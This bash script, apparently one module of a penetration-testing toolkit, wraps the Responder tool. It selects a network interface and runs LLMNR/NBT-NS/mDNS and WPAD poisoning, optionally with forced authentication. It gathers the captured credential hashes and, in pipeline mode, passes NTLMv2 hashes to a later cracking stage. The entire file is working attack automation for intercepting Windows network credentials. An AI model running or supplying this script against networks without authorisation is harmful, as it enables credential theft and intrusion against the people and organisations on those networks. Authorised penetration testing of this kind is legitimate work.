#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "RESPONDER" "LLMNR / NBT-NS / MDNS poisoning · hash capture"

require_tool responder "apt install responder"

outdir="$(make_outdir)"
outfile="$outdir/responder.txt"
: > "$outfile"

# ── Interface selection ───────────────────────────────────────────────────────
section "INTERFACE"

if [[ -n "${SESSION_DIR:-}" ]]; then
  IFACE="$(resolve_iface any)"
  _extra_flags=()  # Standard mode: -w -v (WPAD + verbose)
  printf '  %s[CHAIN]%s Interface: %s  Mode: Standard WPAD+verbose  (pipeline auto)%s\n\n' \
    "${CYAN}" "${RESET}" "$IFACE" "${RESET}"
else
  mapfile -t _ifaces < <(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | grep -vE '^(rmnet|r_rmnet|bond|dummy)')
  if [[ ${#_ifaces[@]} -eq 0 ]]; then
    printf '  %s[!]%s No network interfaces found%s\n' "${RED}" "${RESET}" "${RESET}"
    exit 1
  fi
  printf '  %s[*]%s Available interfaces:%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
  for i in "${!_ifaces[@]}"; do
    _ip=$(ip -o -4 addr show "${_ifaces[$i]}" 2>/dev/null | awk '{print $4}' | head -1)
    printf '  %s[%02d]%s  %-12s  %s%s%s\n' \
      "${CYAN}" "$((i+1))" "${RESET}" "${_ifaces[$i]}" "${DIM}" "${_ip:-no IPv4}" "${RESET}"
  done
  printf '\n  %s>>%s Select interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_ifaces[@]}"
  read -r _sel; _sel="${_sel:-1}"
  if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_ifaces[@]} )); then
    printf '  %s[!]%s Invalid selection%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
  fi
  IFACE="${_ifaces[$(( _sel - 1 ))]}"
  printf '\n  %s[SYS]%s Interface : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"

  section "OPTIONS"
  printf '  %s[01]%s  Standard           -w -v  (WPAD + verbose)\n'           "${CYAN}" "${RESET}"
  printf '  %s[02]%s  Forced auth        -w -v -F  (inject forced auth)\n'    "${CYAN}" "${RESET}"
  printf '  %s[03]%s  Analyze only       -w -v -A  (passive — no poisoning)\n' "${CYAN}" "${RESET}"
  printf '\n'
  printf '  %s>>%s Mode [1-3, default 1]: ' "${CYAN}" "${RESET}"
  read -r _mode
  _extra_flags=()
  case "${_mode:-1}" in
    2) _extra_flags+=(-F) ;;
    3) _extra_flags+=(-A) ;;
  esac
fi

# ── Run ───────────────────────────────────────────────────────────────────────
section "CAPTURE"

_responder_logs="/usr/share/responder/logs"

printf '  %s[*]%s Starting Responder on %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
printf '  %s[*]%s Press %sCTRL+C%s to stop and view results\n\n' "${CYAN}" "${RESET}" "${BOLD}" "${RESET}"

printf '=== RESPONDER: %s ===\nFlags: -w -v %s\n\n' "$IFACE" "${_extra_flags[*]:-}" >> "$outfile"

responder -I "$IFACE" -w -v "${_extra_flags[@]}" 2>&1 || true

# ── Results ───────────────────────────────────────────────────────────────────
section "CAPTURED HASHES"

printf '\n'
if [[ -d "$_responder_logs" ]]; then
  _hash_files=()
  while IFS= read -r _f; do
    _hash_files+=("$_f")
  done < <(find "$_responder_logs" -type f -name "*.txt" -newer "$outfile" 2>/dev/null | sort)

  if [[ ${#_hash_files[@]} -gt 0 ]]; then
    printf '  %s[+]%s New hash files captured:\n\n' "${GREEN}" "${RESET}"
    for _hf in "${_hash_files[@]}"; do
      printf '  %s%s%s\n' "${CYAN}" "$_hf" "${RESET}"
      cat "$_hf" | tee -a "$outfile"
      printf '\n'
    done
  else
    _all_hashes=$(find "$_responder_logs" -type f -name "*.txt" 2>/dev/null | xargs grep -l ":" 2>/dev/null || true)
    if [[ -n "$_all_hashes" ]]; then
      printf '  %s[*]%s All logs in %s:\n' "${CYAN}" "${RESET}" "$_responder_logs"
      echo "$_all_hashes" | while read -r _hf; do
        printf '  %s%s%s\n' "${DIM}" "$_hf" "${RESET}"
      done
    else
      printf '  %s[~]%s No hashes captured this session%s\n' "${DIM}" "${RESET}" "${RESET}"
    fi
  fi
else
  printf '  %s[~]%s Responder logs dir not found at %s%s%s\n' \
    "${DIM}" "${RESET}" "${DIM}" "$_responder_logs" "${RESET}"
fi

printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

# ── Pipeline chain: publish NTLMv2 hashes to chain_hashes.txt ────────────────
if [[ -n "${SESSION_DIR:-}" ]] && [[ -d "$_responder_logs" ]]; then
  _total_new=0
  while IFS= read -r _hf; do
    _cnt=$(grep -cE '::[^:]+:[0-9a-fA-F]{8}:' "$_hf" 2>/dev/null || echo 0)
    if (( _cnt > 0 )); then
      cat "$_hf" >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
      _total_new=$(( _total_new + _cnt ))
    fi
  done < <(find "$_responder_logs" -type f -name "*NTLMv*" 2>/dev/null)
  if (( _total_new > 0 )); then
    sort -u "${SESSION_DIR}/chain_hashes.txt" -o "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
    printf '  %s[CHAIN]%s chain_hashes.txt: %d NTLMv2 hash(es) published for hashcrack%s\n\n' \
      "${CYAN}" "${RESET}" "$_total_new" "${RESET}"
  fi
fi

mark_done "$outfile"
